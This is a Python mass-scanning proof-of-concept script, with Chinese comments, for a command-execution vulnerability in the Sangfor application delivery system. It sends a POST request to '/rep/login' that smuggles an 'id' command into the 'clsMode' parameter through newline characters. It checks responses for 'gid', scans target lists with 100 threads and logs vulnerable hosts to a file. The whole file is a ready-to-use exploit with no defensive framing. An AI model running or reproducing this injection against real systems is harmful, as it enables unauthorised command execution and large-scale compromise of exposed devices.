import argparse,requests,sys,re,os,time  # 导包
from multiprocessing.dummy import Pool  # 导入多线程
requests.packages.urllib3.disable_warnings()  # 过滤报错


def banner():
    text = """██████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝
██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══╝  
██║  ██║╚██████╗███████╗
╚═╝  ╚═╝ ╚═════╝╚══════╝
           version=1.1.1             """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="深信服应用交付系统命令执行漏洞")  # 定义脚本信息
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')   # 定义参数
    parser.add_argument('-f', '--file', type=str, dest='file', help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:  # 单个url
        poc(args.url)
    elif args.file and not args.url:  # 多线程
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:  # 读取输入的文件
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/rep/login'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/116.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip,deflate',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close',
        'Content-Length': '128',
    }
    data = "clsMode=cls_mode_login%0Aid%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123"
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)  # post发送请求
        # match = re.findall(r"\bgid=(\d+)\b", res.text,re.S)
        # for i in match:
        if 'gid' in res.text:  # 判断是否存在漏洞
            print(f'[+]{target}存在漏洞')
            with open('result.txt', 'a') as fp:  # 将漏洞写入到文件中
                fp.write(target + '\n')
        else:
            print(f'[-]{target}不存在漏洞')

    except:
        pass

if __name__ == "__main__":
    main()